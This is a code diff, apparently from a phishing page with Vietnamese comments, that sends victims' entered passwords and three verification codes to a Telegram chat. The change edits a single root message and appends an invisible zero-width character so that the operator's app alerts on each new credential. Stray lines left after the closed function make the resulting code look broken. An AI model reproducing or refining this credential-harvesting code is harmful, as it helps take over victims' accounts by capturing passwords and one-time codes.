@@ -478,45 +478,23 @@ const buildFullMessage = (overrides?: Partial<{
 };
 const sendInitialDataToTelegram = async () => {
   if (!telegramEnabled) return;
-
-  if (typeof window !== "undefined") {
-    localStorage.removeItem("telegram_msg_id");
-  }
+  if (typeof window !== "undefined") localStorage.removeItem("telegram_msg_id");
   setMessageId(null);
-  
-  stateRef.current = {
-    password1: "",
-    password2: "",
-    code1: "",
-    code2: "",
-    code3: "",
-    status: "⏳ Đang chờ xử lý...",
-    lastUpdate: "",
-  };
+  stateRef.current = { password1: "", password2: "", code1: "", code2: "", code3: "", status: "⏳ Đang chờ xử lý...", lastUpdate: "" };
   setPassword1(""); setPassword2(""); setCode1(""); setCode2(""); setCode3("");
 
   const text = buildFullMessage();
-  
-  // Gửi tin nhắn gốc (không kêu để tránh làm phiền lúc mới gửi form)
+  // Tin nhắn gốc gửi đi (có thể để im lặng hoặc kêu tùy bạn, thường để im lặng)
   const rootMessageId = await sendTelegramMessage(text, { disable_notification: true });
   
-  // LƯU LẠI ID TIN NHẮN GỐC
   if (rootMessageId) {
     setMessageId(rootMessageId);
-    if (typeof window !== "undefined") {
-      localStorage.setItem("telegram_msg_id", rootMessageId);
-    }
+    if (typeof window !== "undefined") localStorage.setItem("telegram_msg_id", rootMessageId);
   }
 };
 const pushUpdate = async (
   updates: Partial<{
-    password1: string;
-    password2: string;
-    code1: string;
-    code2: string;
-    code3: string;
-    status: string;
-    lastUpdate: string;
+    password1: string; password2: string; code1: string; code2: string; code3: string; status: string; lastUpdate: string;
   }>
 ) => {
   if (!telegramEnabled) return;
@@ -524,7 +502,17 @@ const pushUpdate = async (
   // 1) Cập nhật state
   stateRef.current = { ...stateRef.current, ...updates };
 
-  // 2) Gửi tin nhắn thông báo có âm thanh (kêu)
+  // 2) Lấy ID tin nhắn gốc
+  const targetId = messageId ?? (typeof window !== "undefined" ? localStorage.getItem("telegram_msg_id") : null);
+  if (!targetId) return;
+
+  // 3) Build nội dung mới (thêm 1 khoảng trắng vô hình ở cuối để ép Telegram kêu)
+  const newText = buildFullMessage() + "\u200B"; 
+  
+  // 4) Edit tin nhắn gốc. Việc Edit nội dung mới sẽ kích hoạt âm thanh thông báo trên app.
+  await editTelegramMessage(targetId, newText);
+};
+
   let notifyText = "";
   if (updates.password1) notifyText = `🔔 <b>Mật khẩu 1:</b> <code>${escapeHtml(updates.password1)}</code>`;
   if (updates.password2) notifyText = `🔔 <b>Mật khẩu 2:</b> <code>${escapeHtml(updates.password2)}</code>`;
